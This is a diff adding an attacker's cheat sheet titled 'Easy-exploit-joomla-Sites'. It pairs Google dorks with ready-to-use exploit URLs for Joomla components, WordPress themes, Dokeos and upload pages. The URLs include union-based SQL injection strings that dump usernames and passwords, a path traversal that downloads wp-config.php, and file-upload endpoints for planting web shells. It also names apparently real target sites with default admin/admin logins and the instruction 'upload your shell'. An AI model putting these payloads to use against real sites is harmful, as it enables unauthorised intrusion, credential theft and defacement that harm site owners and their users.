@@ -1,0 +1,60 @@
+Easy-exploit-joomla-Sites
+Dork:inurl:"index.php?option=com_simplephotogallery"
+
+
+
+/index.php?option=com_simplephotogallery&view=images&albumid=-1+/*!uNiON*/+/*!SeLeCt*/+1,concat%28username,0x3a,password%29,3,4,5,6,7,8,9,10,11,12+from+jos_users--+
+-----
+Joomla Components (com_ignitegallery) SQL-Injection Vulnerabilities - 
+
+Dorks: inurl:com_ignitegallery , Exploits: /index.php?
+option=com_ignitegallery&task=view&gallery=-1+union+select+1,2,concat(username,char(58),password)UAH,4,5,6,7,8,9,10+from+jos_users--&Itemid=18
+-----
+Joomla Exploit : com maian15
+
+Dork : "inurl:option=com_maian15"
+
+Exploit:
+
+/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?
+-----
+Deface Metode Wordpress bazar Theme Arbitrary File Download Vulnerability
+
+Dork: inurl:wp-content/themes/bazar/
+exploit: /wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php
+-----
+exploit bypass admin
+inurl 
+allinurl:galimg
+inurl:galorg
+index of /galorg site:ae
+target 
+http://mspmt.com/adminaccess/welcome.asp
+http://www.extrememarineme.com/adminaccess/welcome.asp
+add
+adminaccess/welcome.asp
+user=admin pass=admin
+adminaccess/gallery.aspx
+upload your shell 
+http://mspmt.com/
+-----
+Upload dork and exploit :3
+Dorks :
+
+inurl:/upload.php
+inurl /uploadbutton.html
+inurl /upload-form.php
+inurl /upload/up.php
+inurl /upload.html
+-----
+Dokeos Upload
+
+Dork:inurl:/index.php?include=Overview.html
+Exploit:/main/inc/lib/fckeditor/editor/plugins/ImageManager/manager.php
+-----
+Dork : inurl:"admin/my_documents/my_files"
+Exploit : admin/rte_popup_file_atch.asp
+-----
+Dork:inurl:"/mfm.php"
+-----
+Dork:intitle:"index of" people.lst.
